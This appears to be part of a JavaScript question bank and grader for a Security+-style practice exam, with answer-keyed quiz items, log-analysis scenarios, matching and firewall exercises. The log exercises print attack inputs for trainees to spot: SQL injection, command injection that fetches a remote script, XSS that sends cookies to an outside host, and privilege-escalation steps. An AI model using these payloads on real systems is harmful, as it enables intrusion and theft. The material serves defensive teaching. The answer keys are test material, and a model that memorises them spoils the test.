consequence is this?","op":["Reputational damage","Fine","Loss of license","Contractual impact"],"a":[2],"n":1,"e":"Regulators can revoke licenses."},{"o":"5.4","s":"Regulators fine a company and customers lose trust after it fails to protect personal data. Which consequences are described?","op":["Sanctions and loss of license","Contractual impacts only","Fines and reputational damage","None"],"a":[2],"n":1,"e":"Penalties and loss of trust both followed."},{"o":"5.4","s":"A customer asks a retailer to permanently delete all their personal data. Which privacy right is this?","op":["Data sovereignty","Right to be forgotten","Data retention","Legal hold"],"a":[1],"n":1,"e":"It is the right to erasure."},{"o":"5.4","s":"Under privacy law, the individual whose personal data is collected is called the:","op":["Data processor","Data custodian","Data subject","Data controller"],"a":[2],"n":1,"e":"The person the data is about."},{"o":"5.5","s":"An auditor provides a formal written statement that a company's controls meet a specific standard. What is this?","op":["Attestation","Risk register","Rules of engagement","Penetration test"],"a":[0],"n":1,"e":"Attestation is formal confirmation."},{"o":"5.5","s":"Internal auditors check whether employees are following documented security policies. What type of audit is this?","op":["Internal compliance audit","External regulatory audit","Vendor questionnaire","Penetration test"],"a":[0],"n":1,"e":"Internal compliance checks."},{"o":"5.5","s":"What is the PRIMARY advantage of an external audit over an internal audit?","op":["Faster completion of the audit","Greater independence and objectivity","Less documentation is required","Lower cost than internal staff"],"a":[1],"n":1,"e":"External auditors are independent."},{"o":"5.5","s":"A company voluntarily hires a firm to evaluate its security program against a framework. What is this?","op":["Self-assessment","External assessment","Internal audit","Regulatory examination"],"a":[1],"n":1,"e":"It is an outside, voluntary assessment."},{"o":"5.5","s":"An outside firm with no ties to the company evaluates its controls and issues an opinion. What is this?","op":["Tabletop exercise","Independent third-party audit","Internal compliance audit","Self-assessment"],"a":[1],"n":1,"e":"An external, independent audit."},{"o":"5.5","s":"A government agency inspects a bank's controls to verify compliance with financial regulations. What is this?","op":["Bug bounty","Regulatory examination","Self-assessment","Internal audit"],"a":[1],"n":1,"e":"Regulators conduct examinations."},{"o":"5.5","s":"A department completes a checklist to evaluate its own security practices before a formal audit. What is this?","op":["Self-assessment","Regulatory examination","Third-party attestation","Independent audit"],"a":[0],"n":1,"e":"Self-assessments are internal."},{"o":"5.5","s":"A group of board members oversees the company's internal and external audit activities. What is this?","op":["Risk owner","Audit committee","Incident response team","Change advisory board"],"a":[1],"n":1,"e":"Audit committees oversee audits."},{"o":"5.5","s":"A tester tries to enter the building by tailgating employees and picking locks. Which type of test is this?","op":["Physical","Defensive","Partially known","Integrated"],"a":[0],"n":1,"e":"Physical tests target facilities."},{"o":"5.5","s":"Attackers and defenders work together during a test, sharing findings in real time to improve detection. Which approach is this?","op":["Unknown environment","Offensive only","Passive","Integrated"],"a":[3],"n":1,"e":"Integrated testing combines offense and defense."},{"o":"5.5","s":"A team's role during an exercise is to detect and respond to simulated attacks. Which perspective is this?","op":["Defensive","Offensive","Passive reconnaissance","Physical"],"a":[0],"n":1,"e":"Defenders detect and respond."},{"o":"5.5","s":"Testers receive network diagrams, source code, and credentials before testing. Which environment is this?","op":["Partially known environment","Unknown environment","Passive environment","Known environment"],"a":[3],"n":1,"e":"Full information means a known environment."},{"o":"5.5","s":"Testers receive no information about the target and must discover everything. Which environment is this?","op":["Unknown environment","Integrated environment","Known environment","Partially known environment"],"a":[0],"n":1,"e":"No information means an unknown environment."},{"o":"5.5","s":"Testers get a list of IP ranges but no credentials or documentation. Which environment is this?","op":["Defensive environment","Partially known environment","Unknown environment","Known environment"],"a":[1],"n":1,"e":"Some information means partially known."},{"o":"5.5","s":"A tester researches a company through public websites and social media without touching its systems. Which reconnaissance is this?","op":["Defensive","Integrated","Passive","Active"],"a":[2],"n":1,"e":"Passive recon doesn't interact with the target."},{"o":"5.5","s":"A tester runs port scans against the company's public IP addresses. Which reconnaissance is this?","op":["Passive","Physical","Defensive","Active"],"a":[3],"n":1,"e":"Active recon interacts with targets."},{"o":"5.6","s":"New hires complete security training in their first week, and all employees retake it every year. Which concepts does this describe?","op":["Development and execution","Risky and unexpected behavior","Initial and recurring training","Ad hoc and one-time assessments"],"a":[2],"n":1,"e":"Training happens at hire and repeats periodically."},{"o":"5.6","s":"Which metric BEST shows whether a phishing awareness program is working over time?","op":["The number of training emails sent monthly","The number of security policies published","The size of the security awareness budget","Falling click rates and rising report rates"],"a":[3],"n":1,"e":"Behavior change is what matters."},{"o":"5.6","s":"A company sends simulated phishing emails to employees and tracks who clicks. What is this?","op":["Watering hole","Pretexting","Vishing attack","Phishing campaign"],"a":[3],"n":1,"e":"Simulated campaigns train and measure."},{"o":"5.6","s":"What should employees be trained to do when they receive a suspicious email?","op":["Delete it quietly and move on","Report it using the official process","Forward it to coworkers as a warning","Reply to the sender to verify it"],"a":[1],"n":1,"e":"Reporting lets security respond and protect others."},{"o":"5.6","s":"An employee disables antivirus because it slows down their computer. How should this behavior be categorized?","op":["Compliant","Unintentional","Risky","Unexpected"],"a":[2],"n":1,"e":"Knowingly weakening security is risky behavior."},{"o":"5.6","s":"An employee accidentally emails a spreadsheet of customer data to the wrong recipient. Which type of anomalous behavior is this?","op":["Expected","Unintentional","Risky","Malicious"],"a":[1],"n":1,"e":"Mistakes are unintentional."},{"o":"5.6","s":"An accountant logs in at 3:00 a.m. on a weekend for the first time ever. Which type of anomalous behavior is this?","op":["Risky","Normal","Unintentional","Unexpected"],"a":[3],"n":1,"e":"It departs from the usual pattern."},{"o":"5.6","s":"Remote staff are trained to secure home routers and avoid public Wi-Fi without a VPN. Which training topic is this?","op":["Removable media and cables","Hybrid/remote work environments","Insider threat","Situational awareness"],"a":[1],"n":1,"e":"This covers remote work security."}];

{id:'log1',type:'log',domain:2,minutes:5,title:'Investigate overnight VPN logins',
 scenario:'<p>The SOC flagged unusual activity on the VPN gateway. Select every log line that is evidence of the attack, then identify the attack type.</p>',
 lines:[
  ['2026-03-04 02:14:07 vpn-gw auth FAIL    user=jsmith   src=198.51.100.23',1],
  ['2026-03-04 02:14:09 vpn-gw auth FAIL    user=amartin  src=198.51.100.23',1],
  ['2026-03-04 02:14:11 vpn-gw auth FAIL    user=kpatel   src=198.51.100.23',1],
  ['2026-03-04 02:14:13 vpn-gw auth FAIL    user=lchen    src=198.51.100.23',1],
  ['2026-03-04 02:14:15 vpn-gw auth SUCCESS user=rgarcia  src=198.51.100.23',1],
  ['2026-03-04 02:14:17 vpn-gw auth FAIL    user=tnguyen  src=198.51.100.23',1],
  ['2026-03-04 08:02:41 vpn-gw auth FAIL    user=mdavis   src=10.1.1.88',0],
  ['2026-03-04 08:02:55 vpn-gw auth SUCCESS user=mdavis   src=10.1.1.88',0],
  ['2026-03-04 08:05:12 vpn-gw auth SUCCESS user=jsmith   src=10.1.1.41',0]],
 answer:'Password spraying',
 ex:'One external IP tries one login against many different accounts within seconds, which is password spraying (a few passwords across many accounts). Brute force would show many attempts against a single account. The 02:14:15 success is the most urgent line, because it means rgarcia\'s account is likely compromised. The 08:02 lines are a normal typo followed by a successful login from an internal address.'},

{id:'log2',type:'log',domain:2,minutes:6,title:'Review the storefront search logs',
 scenario:'<p>A web application firewall was in monitor-only mode during a weekend. Review the access log, select every line that shows malicious input, and identify the attack. Values are URL-encoded: <code class="mono">%27</code> is a single quote, <code class="mono">%3D</code> is =, <code class="mono">%2C</code> is a comma, <code class="mono">%3B</code> is a semicolon.</p>',
 lines:[
  ['203.0.113.77 "GET /search.php?q=laptop HTTP/1.1" 200 8812',0],
  ['203.0.113.77 "GET /search.php?q=O%27Brien+books HTTP/1.1" 200 6120',0],
  ['203.0.113.77 "GET /search.php?q=%27+OR+%271%27%3D%271 HTTP/1.1" 200 4183922',1],
  ['203.0.113.77 "GET /search.php?q=%27+UNION+SELECT+username%2Cpassword+FROM+users-- HTTP/1.1" 200 15330',1],
  ['203.0.113.77 "GET /product.php?id=42 HTTP/1.1" 200 5521',0],
  ['203.0.113.77 "GET /product.php?id=42%3B+DROP+TABLE+orders-- HTTP/1.1" 500 312',1],
  ['203.0.113.77 "GET /images/logo.png HTTP/1.1" 200 20441',0],
  ['203.0.113.77 "POST /login.php HTTP/1.1" 302 0',0]],
 answer:'SQL injection',
 ex:'Decoded, the payloads read: \' OR \'1\'=\'1 (always true, and the 4 MB response suggests the whole table was dumped), \' UNION SELECT username,password FROM users-- (pulling credentials), and 42; DROP TABLE orders-- (a destructive statement; the 500 error suggests it failed). The O\'Brien search contains a quote but is a normal search term, which is the red herring.'},

{id:'ctl1',type:'match',domain:1,minutes:6,title:'Categorize the security controls',
 scenario:'<p>Classify each control by its category and its type. Where CompTIA material varies, any widely accepted answer is marked correct.</p>',
 columns:[{name:'Category',options:['Technical','Managerial','Operational','Physical']},{name:'Type',options:['Preventive','Detective','Corrective','Compensating','Deterrent','Directive']}],
 rows:[
  {item:'Intrusion prevention system blocking malicious packets inline',a:[['Technical'],['Preventive']],ex:'An IPS is enforced by a system and stops traffic before harm occurs.'},
  {item:'Sign reading "Premises monitored by video surveillance"',a:[['Physical'],['Deterrent']],ex:'The sign itself prevents nothing. It discourages attempts, which makes it a deterrent.'},
  {item:'Acceptable use policy employees must sign',a:[['Managerial'],['Directive']],ex:'Policies are managerial, and a policy that tells people what they must or must not do is directive.'},
  {item:'Analysts reviewing failed-login reports every morning',a:[['Operational'],['Detective']],ex:'People carry this out day to day (operational) to find problems that already happened (detective).'},
  {item:'Restoring a server from backup after ransomware',a:[['Operational','Technical'],['Corrective']],ex:'Restoration fixes damage after an incident, so it is corrective.'},
  {item:'Legacy system that cannot be patched placed on an isolated VLAN',a:[['Technical'],['Compensating']],ex:'The preferred control (patching) is impossible, so isolation compensates for it.'},
  {item:'Badge readers on server room doors',a:[['Physical'],['Preventive']],ex:'Badge access controls entry to a space, so CompTIA treats it as physical.'}]},

{id:'ir1',type:'match',domain:4,minutes:5,title:'Map actions to incident response phases',
 scenario:'<p>A workstation was found beaconing to a command-and-control server. Match each action to the incident response phase it belongs to.</p>',
 columns:[{name:'Phase',options:['Preparation','Detection','Analysis','Containment','Eradication','Recovery','Lessons learned']}],
 rows:[
  {item:'The SIEM raises an alert on repeated outbound connections to a rare domain',a:[['Detection']],ex:'An alert is how the incident is first identified.'},
  {item:'Analysts correlate logs to find patient zero and every affected host',a:[['Analysis']],ex:'Determining scope and root cause is analysis.'},
  {item:'The switch port is disabled, but the machine stays powered on',a:[['Containment']],ex:'Isolating it stops the spread while preserving memory for forensics.'},
  {item:'The malicious scheduled task and dropped binaries are removed',a:[['Eradication']],ex:'Removing the threat and its persistence is eradication.'},
  {item:'The host is reconnected and monitored closely for a week',a:[['Recovery']],ex:'Returning to normal operation with extra monitoring is recovery.'},
  {item:'The team updates the playbook after an after-action meeting',a:[['Lessons learned']],ex:'Improving the process based on what happened is lessons learned.'},
  {item:'Responders run a tabletop exercise and stock a jump bag',a:[['Preparation']],ex:'Getting ready before an incident is preparation.'}]},

{id:'dp1',type:'match',domain:1,minutes:5,title:'Choose the data protection technique',
 scenario:'<p>Match each requirement to the technique that best satisfies it. Each technique is used once.</p>',
 columns:[{name:'Technique',options:['Hashing','Encryption','Tokenization','Data masking','Digital signature','Salting','Key stretching']}],
 rows:[
  {item:'A payment processor swaps card numbers for random values, keeping the real numbers in a secure vault',a:[['Tokenization']],ex:'The token has no mathematical link to the card number, and the mapping lives in a vault.'},
  {item:'Developers need realistic customer records for testing without seeing real data',a:[['Data masking']],ex:'Masking replaces sensitive values with fake but realistic ones and is not meant to be reversed.'},
  {item:'Confirm a downloaded installer was not altered',a:[['Hashing']],ex:'Comparing the file\'s hash to the published hash verifies integrity.'},
  {item:'Prove a message came from the CFO and was not modified',a:[['Digital signature']],ex:'A signature provides integrity plus authentication and non-repudiation, which a hash alone cannot.'},
  {item:'Two users with the same password must not end up with identical stored hashes',a:[['Salting']],ex:'A unique random salt per password makes identical passwords hash differently and defeats rainbow tables.'},
  {item:'Make every password guess computationally slow for an attacker',a:[['Key stretching']],ex:'PBKDF2, bcrypt and similar run the hash many times to slow guessing.'},
  {item:'A stolen laptop\'s drive must be unreadable',a:[['Encryption']],ex:'Full-disk encryption keeps the real data, readable only with the key.'}]},

{id:'iam1',type:'match',domain:4,minutes:5,title:'Pick the identity protocol',
 scenario:'<p>Match each scenario to the protocol it describes. Each protocol is used once.</p>',
 columns:[{name:'Protocol',options:['LDAP','Kerberos','RADIUS','TACACS+','SAML','OAuth','OpenID Connect']}],
 rows:[
  {item:'WPA3-Enterprise Wi-Fi checks each user\'s credentials against a central server via 802.1X',a:[['RADIUS']],ex:'RADIUS is the usual back end for 802.1X network access.'},
  {item:'Router administrators need per-command authorization, and the entire session payload encrypted',a:[['TACACS+']],ex:'TACACS+ separates authentication, authorization and accounting and encrypts the whole payload. RADIUS only encrypts the password.'},
  {item:'A user logging in to a Windows domain receives a ticket-granting ticket',a:[['Kerberos']],ex:'Tickets and a TGT are the signature of Kerberos.'},
  {item:'An HR application looks up which groups a user belongs to in the directory',a:[['LDAP']],ex:'LDAP queries directory services.'},
  {item:'Employees log in once at the corporate identity provider and reach a partner\'s web app through XML assertions',a:[['SAML']],ex:'SAML is XML-based web single sign-on across organizations.'},
  {item:'A scheduling app gets a token to read a user\'s calendar without ever seeing their password',a:[['OAuth']],ex:'Delegated authorization with an access token is OAuth.'},
  {item:'A mobile app uses "Sign in with Google" and receives an ID token describing who the user is',a:[['OpenID Connect']],ex:'OpenID Connect adds authentication (the ID token) on top of OAuth.'}]},

{id:'ord1',type:'order',domain:4,minutes:4,title:'Order of volatility',
 scenario:'<p>You are collecting evidence from a compromised server that is still running. Arrange the sources from the one you should collect first to the one you should collect last.</p>',
 items:[['ram','RAM, including running processes and network connections'],['disk','Local hard drive'],['cache','CPU registers and cache'],['backup','Archived backup tapes'],['swap','Swap file and temporary files'],['remote','Logs already sent to the remote syslog server']],
 constraints:[['cache','ram','CPU cache changes in nanoseconds, so it goes before RAM.'],['ram','swap','RAM is lost at power-off, while swap survives on disk.'],['swap','disk','Swap and temp files are overwritten constantly, faster than general disk contents.'],['disk','remote','The local disk can still be altered by the attacker, while remote logs are already off the box.'],['remote','backup','Archival media barely changes, so it comes last.']],
 start:['disk','backup','swap','remote','ram','cache'],
 ex:'Collect the most volatile evidence first: cache, RAM, swap and temp files, disk, remote logs, then archival media.'},

{id:'ord2',type:'order',domain:4,minutes:6,title:'Fix the rule order',
 scenario:'<p>An administrator wrote these five rules, but traffic is not behaving as intended. Requirements: block the known-malicious range 203.0.113.0/24 completely, let the public reach the web server on HTTPS, and let only the web server reach the database. Arrange the rules so all requirements are met. Rules are processed top to bottom, and the first match wins.</p>',
 items:[['a','Deny  Any → 10.1.2.50  TCP 1433'],['b','Allow 172.16.10.10 → 10.1.2.50  TCP 1433'],['c','Allow Any → 172.16.10.10  TCP 443'],['d','Deny  Any → Any  Any'],['e','Deny  203.0.113.0/24 → Any  Any']],
 mono:true,start:['d','a','c','e','b'],
 constraints:[['e','c','The malicious-range block must come before the public HTTPS allow, or that range can still reach the web server.'],['b','a','The specific web-server allow must come before the general database deny, or the deny matches first.'],['*','d','The deny-all rule must be last, since nothing below it would ever be reached.']],
 ex:'General rule: specific rules above general ones, blocks for known-bad sources above broad allows, and deny-all at the bottom. Several orders are valid as long as these three relationships hold.'}
];

  {req:'Network devices send SNMP traps to the SNMP manager.',a:{src:['10.10.5.0/24'],dst:['10.10.9.20'],port:['162'],proto:['UDP'],action:['Allow']},ex:'Traps are sent by devices to the manager on UDP 162. Note the direction is the reverse of polling.'},
  {req:'Network devices forward their logs to the syslog server.',a:{src:['10.10.5.0/24'],dst:['10.10.9.30'],port:['514'],proto:['UDP'],action:['Allow']},ex:'Traditional syslog is UDP 514.'},
  {req:'Network devices synchronize their clocks with the internal NTP server.',a:{src:['10.10.5.0/24'],dst:['10.10.9.40'],port:['123'],proto:['UDP'],action:['Allow']},ex:'NTP is UDP 123. Consistent time is essential for correlating logs.'},
  {req:'Network devices must not transfer configuration files using unauthenticated TFTP to any destination.',a:{src:['10.10.5.0/24'],dst:['Any'],port:['69'],proto:['UDP'],action:['Deny']},ex:'TFTP is UDP 69 and has no authentication or encryption.'}]},

{id:'fw5',type:'firewall',domain:4,title:'Public DNS and mail services',
 scenario:'<p>A company hosts its own public DNS and mail server in a screened subnet. Configure one rule per requirement.</p>',
 zones:[{name:'Internet',cidr:'Any',hosts:[['Secondary DNS (hosted provider)','198.51.100.53']]},
  {name:'Screened subnet',cidr:'172.16.20.0/24',hosts:[['Primary DNS server','172.16.20.53'],['Mail server','172.16.20.25']]}],
 addrs:['Any','198.51.100.53','172.16.20.0/24','172.16.20.53','172.16.20.25'],
 rows:[
  {req:'Anyone on the internet can resolve the company\'s domain names using the primary DNS server.',a:{src:['Any'],dst:['172.16.20.53'],port:['53'],proto:['UDP','Any'],action:['Allow']},ex:'Standard DNS queries use UDP 53.'},
  {req:'The secondary DNS server must receive zone transfers from the primary DNS server.',a:{src:['198.51.100.53'],dst:['172.16.20.53'],port:['53'],proto:['TCP'],action:['Allow']},ex:'Zone transfers use TCP 53. Limiting them to the secondary prevents attackers from dumping the whole zone.'},
  {req:'Other mail servers on the internet deliver email to the mail server.',a:{src:['Any'],dst:['172.16.20.25'],port:['25'],proto:['TCP'],action:['Allow']},ex:'Server-to-server SMTP delivery uses TCP 25.'},
  {req:'Remote employees submit outgoing email to the mail server using authenticated submission.',a:{src:['Any'],dst:['172.16.20.25'],port:['587'],proto:['TCP'],action:['Allow']},ex:'Mail submission from clients uses TCP 587.'},
  {req:'Remote employees read their mailbox using encrypted IMAP.',a:{src:['Any'],dst:['172.16.20.25'],port:['993'],proto:['TCP'],action:['Allow']},ex:'IMAPS is TCP 993; plain IMAP is 143.'},
  {req:'Block unencrypted POP3 access to the mail server.',a:{src:['Any'],dst:['172.16.20.25'],port:['110'],proto:['TCP'],action:['Deny']},ex:'POP3 is TCP 110 and sends credentials in cleartext (POP3S is 995).'}]},

{id:'fw6',type:'firewall',domain:4,title:'Remote access through the VPN',
 scenario:'<p>Remote workers connect through an IPsec VPN gateway and receive addresses from the VPN pool. Configure the rules in the order shown. Pay attention to how rule order affects the RDP requirements.</p>',
 zones:[{name:'Internet',cidr:'Any',hosts:[]},
  {name:'VPN gateway',cidr:'198.51.100.10',hosts:[]},
  {name:'VPN client pool',cidr:'10.8.0.0/24',hosts:[]},
  {name:'Internal servers',cidr:'10.30.0.0/24',hosts:[['File server','10.30.0.20'],['Intranet','10.30.0.30'],['Terminal server','10.30.0.40']]}],
 addrs:['Any','198.51.100.10','10.8.0.0/24','10.30.0.0/24','10.30.0.20','10.30.0.30','10.30.0.40'],
 rows:[
  {req:'Remote workers must be able to start IPsec key exchange with the VPN gateway.',a:{src:['Any'],dst:['198.51.100.10'],port:['500'],proto:['UDP'],action:['Allow']},ex:'IKE runs on UDP 500.'},
  {req:'VPN users map drives on the file server.',a:{src:['10.8.0.0/24'],dst:['10.30.0.20'],port:['445'],proto:['TCP'],action:['Allow']},ex:'SMB is TCP 445. The source is the VPN pool, so only authenticated VPN users get access.'},
  {req:'VPN users browse the intranet site securely.',a:{src:['10.8.0.0/24'],dst:['10.30.0.30'],port:['443'],proto:['TCP'],action:['Allow']},ex:'HTTPS is TCP 443.'},
  {req:'VPN users may open graphical remote sessions to the terminal server.',a:{src:['10.8.0.0/24'],dst:['10.30.0.40'],port:['3389'],proto:['TCP'],action:['Allow']},ex:'RDP is TCP 3389. This allow must sit above the next deny, or the deny would match VPN users first.'},
  {req:'Everyone else must be blocked from RDP on the terminal server.',a:{src:['Any'],dst:['10.30.0.40'],port:['3389'],proto:['TCP'],action:['Deny']},ex:'Exposed RDP is a top ransomware entry point. Because Any includes the VPN pool, this deny must come after the VPN allow.'},
  {req:'Block all other traffic.',a:{src:['Any'],dst:['Any'],port:['Any'],proto:['Any'],action:['Deny']},ex:'The explicit deny-all goes last.'}]},

{id:'fw7',type:'firewall',domain:4,title:'Isolate the guest Wi-Fi',

  {req:'Guests may browse secure websites.',a:{src:['172.31.0.0/24'],dst:['Any'],port:['443'],proto:['TCP'],action:['Allow']},ex:'HTTPS is TCP 443.'},

 addrs:['Any','10.60.0.5','10.60.1.0/24','10.60.2.0/24','10.60.2.10','10.60.9.9','10.70.0.0/16'],

{id:'log3',type:'log',domain:2,title:'Review the network diagnostics page',
 scenario:'<p>An internal web tool lets staff ping a host. Select every line that shows malicious input, then identify the attack. Encodings: <code class="mono">%3B</code> is ;, <code class="mono">%7C</code> is |, <code class="mono">%60</code> is a backtick, <code class="mono">%26</code> is &amp;, <code class="mono">%2F</code> is /.</p>',
 lines:[
  ['10.2.4.31 "GET /tools/ping.php?host=8.8.8.8 HTTP/1.1" 200 412',0],
  ['10.2.4.31 "GET /search.php?q=cat+toys HTTP/1.1" 200 7740',0],
  ['10.2.4.77 "GET /tools/ping.php?host=8.8.8.8%3B+id HTTP/1.1" 200 498',1],
  ['10.2.4.77 "GET /tools/ping.php?host=8.8.8.8+%7C%7C+cat+%2Fetc%2Fpasswd HTTP/1.1" 200 2290',1],
  ['10.2.4.77 "GET /tools/ping.php?host=%60whoami%60 HTTP/1.1" 200 377',1],
  ['10.2.4.77 "GET /tools/ping.php?host=8.8.8.8+%26%26+wget+http%3A%2F%2F203.0.113.9%2Fsh.sh HTTP/1.1" 200 530',1],
  ['10.2.4.31 "GET /index.php?page=about HTTP/1.1" 200 3302',0],
  ['10.2.4.77 "GET /favicon.ico HTTP/1.1" 404 0',0]],
 answer:'Command injection',
 ex:'Decoded, the attacker chained shell commands onto the host parameter: ; id, || cat /etc/passwd, `whoami`, and && wget (downloading a script). The "cat toys" search is a red herring because it is a normal search term on a different page.'},

{id:'log4',type:'log',domain:2,title:'Analyze the blog comment logs',
 scenario:'<p>Users report pop-ups and unexpected logouts on a company blog. Select every malicious line, then identify the attack. Encodings: <code class="mono">%3C</code> is &lt;, <code class="mono">%3E</code> is &gt;, <code class="mono">%27</code> is a quote, <code class="mono">%2B</code> is +, <code class="mono">%24</code> is $.</p>',
 lines:[
  ['198.51.100.40 "POST /comments body=Great+article%21 HTTP/1.1" 201 88',0],
  ['198.51.100.61 "GET /search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F203.0.113.66%2Fc%3F%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1" 200 5120',1],
  ['198.51.100.40 "GET /search?q=C%2B%2B+tutorial HTTP/1.1" 200 6411',0],
  ['198.51.100.61 "POST /comments body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E HTTP/1.1" 201 88',1],
  ['198.51.100.52 "GET /search?q=laptops+under+%2450 HTTP/1.1" 200 6022',0],
  ['198.51.100.61 "GET /profile?name=%3Csvg%2Fonload%3Dfetch(%27%2F%2F203.0.113.66%2F%27%2Bdocument.cookie)%3E HTTP/1.1" 200 2210',1],
  ['198.51.100.52 "GET /article?id=55 HTTP/1.1" 200 9001',0]],
 answer:'Cross-site scripting (XSS)',
 ex:'The malicious lines inject HTML and JavaScript (a script tag, an img onerror handler, and an svg onload handler) that run in other visitors\' browsers, two of them sending document.cookie to 203.0.113.66 to steal sessions. "C++ tutorial" and "under $50" contain encoded characters but are normal searches.'},

{id:'log5',type:'log',domain:2,title:'Investigate the SSH authentication log',
 scenario:'<p>A Linux server exposed to the internet shows high CPU from sshd. Select every line that is evidence of the attack, then identify it.</p>',
 lines:[
  ['Jun 12 03:11:02 web01 sshd[8811]: Failed password for root from 203.0.113.45 port 51122 ssh2',1],
  ['Jun 12 03:11:03 web01 sshd[8813]: Failed password for root from 203.0.113.45 port 51130 ssh2',1],
  ['Jun 12 03:11:03 web01 sshd[8815]: Failed password for root from 203.0.113.45 port 51136 ssh2',1],
  ['Jun 12 03:11:04 web01 sshd[8819]: Accepted publickey for deploy from 10.0.0.12 port 40022 ssh2',0],
  ['Jun 12 03:11:05 web01 sshd[8821]: Failed password for root from 203.0.113.45 port 51140 ssh2',1],
  ['Jun 12 03:12:47 web01 sshd[8890]: Accepted password for root from 203.0.113.45 port 51388 ssh2',1],
  ['Jun 12 08:30:10 web01 sshd[9120]: Failed password for jdoe from 10.0.0.31 port 52211 ssh2',0],
  ['Jun 12 08:30:19 web01 sshd[9124]: Accepted password for jdoe from 10.0.0.31 port 52215 ssh2',0]],
 answer:'Brute force',
 ex:'One external address hammers a single account (root) with rapid guesses, which is brute force; spraying would try many different accounts. The "Accepted password for root" line is the most serious, because the attack succeeded. Fixes include disabling root login over SSH and requiring key-based authentication. The jdoe lines are a typo followed by a normal internal login.'},

{id:'log6',type:'log',domain:2,title:'Explain the web server outage',
 scenario:'<p>A public web server (203.0.113.80) became unreachable. The firewall log is below. Select every line that is evidence of the attack, then identify it.</p>',
 lines:[
  ['14:00:01 ALLOW UDP 192.0.2.10:53 -> 203.0.113.80:41233 len=3980',1],
  ['14:00:01 ALLOW UDP 198.51.100.22:53 -> 203.0.113.80:7781 len=4012',1],
  ['14:00:01 ALLOW TCP 198.51.100.77:51544 -> 203.0.113.80:443 len=60',0],
  ['14:00:02 ALLOW UDP 203.0.113.200:53 -> 203.0.113.80:22610 len=3966',1],
  ['14:00:02 ALLOW UDP 203.0.113.80:53122 -> 10.0.0.2:53 len=64',0],
  ['14:00:02 ALLOW UDP 192.0.2.99:53 -> 203.0.113.80:9012 len=4096',1],
  ['14:00:03 ALLOW TCP 192.0.2.150:60011 -> 203.0.113.80:443 len=52',0]],
 answer:'DDoS',
 ex:'Many different DNS servers send large (about 4 KB) responses from port 53 to random high ports on a server that never asked for them. This is a reflected, amplified DDoS: the attacker spoofed the victim\'s address in small queries. The server\'s own small query to its internal resolver and the normal HTTPS connections are benign.'},

{id:'log7',type:'log',domain:2,title:'Audit an intern account',
 scenario:'<p>Policy: jsmith is a web administrator allowed to restart nginx with sudo. The account tmpuser belongs to an intern with standard rights. Select every line that is evidence of malicious activity, then identify the attack.</p>',
 lines:[
  ['May 02 10:01:13 app01 sudo: jsmith : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx',0],
  ['May 02 10:15:40 app01 sudo: tmpuser : user NOT in sudoers ; TTY=pts/2 ; USER=root ; COMMAND=/bin/bash',1],
  ['May 02 10:16:02 app01 auditd: uid=1004(tmpuser) exec="find / -perm -4000 -type f"',1],
  ['May 02 10:17:00 app01 CRON[2201]: (root) CMD (/usr/local/bin/backup.sh)',0],
  ['May 02 10:18:31 app01 auditd: uid=1004(tmpuser) euid=0(root) exec="/bin/sh -p"',1],
  ['May 02 10:19:05 app01 useradd[2291]: new user: name=sysbackup, UID=0, GID=0, home=/root',1],
  ['May 02 10:20:44 app01 sshd[2330]: Accepted publickey for jsmith from 10.0.0.15 port 50110 ssh2',0]],
 answer:'Privilege escalation',
 ex:'tmpuser tried sudo without permission, searched for SUID binaries (find -perm -4000), obtained a shell with an effective UID of 0, then created a second UID 0 account for persistence. jsmith\'s sudo use is authorized, and the cron job is routine.'},

{id:'log8',type:'log',domain:2,title:'Trace intercepted traffic',
 scenario:'<p>Users on 10.1.1.0/24 report certificate warnings when visiting banking sites. The gateway is 10.1.1.1. Select every line that is evidence of the attack, then identify it.</p>',
 lines:[
  ['09:00:12 arpwatch: ip 10.1.1.1 is-at 00:1a:2b:3c:4d:5e (gateway, known)',0],
  ['09:14:07 arpwatch: flip flop 10.1.1.1 00:0c:29:9f:88:01 (00:1a:2b:3c:4d:5e)',1],
  ['09:14:09 ids: 10.1.1.47 (00:0c:29:9f:88:01) sent 1,240 gratuitous ARP replies in 60s',1],
  ['09:15:30 dhcpd: DHCPACK on 10.1.1.88 to 3c:22:fb:10:aa:01',0],
  ['09:16:02 arpwatch: new station 10.1.1.90 3c:22:fb:10:aa:77 (new printer)',0],
  ['09:16:40 proxy: 10.1.1.25 TLS bank.example.com cert issuer="Unknown CA" verify=FAIL',1]],
 answer:'On-path attack',
 ex:'The gateway\'s IP suddenly maps to a different MAC address, which belongs to 10.1.1.47, and that host is flooding gratuitous ARP replies. This is ARP poisoning used to sit in the middle of traffic, and the untrusted certificate shows TLS being intercepted. DHCP leases and a new printer are normal.'},

 rows:[
  {item:'Measuring signal strength and interference before installing access points',a:[['Site survey']],ex:'Surveys plan AP placement.'},
  {item:'A color-coded floor plan showing coverage strength',a:[['Heat map']],ex:'Heat maps visualize signal.'},

function okc(c,A){if(c[0]==='*')return A[A.length-1]===c[1];return A.indexOf(c[0])<A.indexOf(c[1])}
function gradeP(q,A){
  if(q.type==='firewall'){let s=0,m=0;q.rows.forEach((r,i)=>['src','dst','port','proto','action'].forEach(k=>{m++;if(r.a[k].includes(A[i][k]))s++}));return s/m}
  if(q.type==='log'){const ev=q.lines.map((l,i)=>l[1]?i:-1).filter(i=>i>=0);const hits=A.sel.filter(i=>ev.includes(i)).length,fp=A.sel.length-hits;
    return ((A.attack===q.answer?1:0)+Math.max(0,hits-fp))/(ev.length+1)}
  if(q.type==='match'){let s=0,m=0;q.rows.forEach((r,i)=>q.columns.forEach((c,j)=>{m++;if(r.a[j].includes(A[i][j]))s++}));return s/m}
  if(q.type==='order')return q.constraints.filter(c=>okc(c,A)).length/q.constraints.length;
  if(q.type==='place')return q.devices.filter(d=>placeOk(d,A)).length/q.devices.length;
  if(q.type==='investigate')return ['host','attack','action'].filter(k=>A[k]===q.answer[k]).length/3;
  if(q.type==='terminal'){const ev=q.findings.map((f,i)=>f[1]?i:-1).filter(i=>i>=0);const hits=A.sel.filter(i=>ev.includes(i)).length,fp=A.sel.length-hits;
    return (Math.max(0,hits-fp)+(A.fix===q.fixQ.answer?1:0))/(ev.length+1)}

function placeOk(d,A){return d.a.length?d.a.includes(A[d.id]):!A[d.id]}
function answeredP(q,A){
  if(!A)return false;
  if(q.type==='firewall')return A.some(r=>Object.values(r).some(v=>v));
  if(q.type==='log')return A.sel.length>0||!!A.attack;
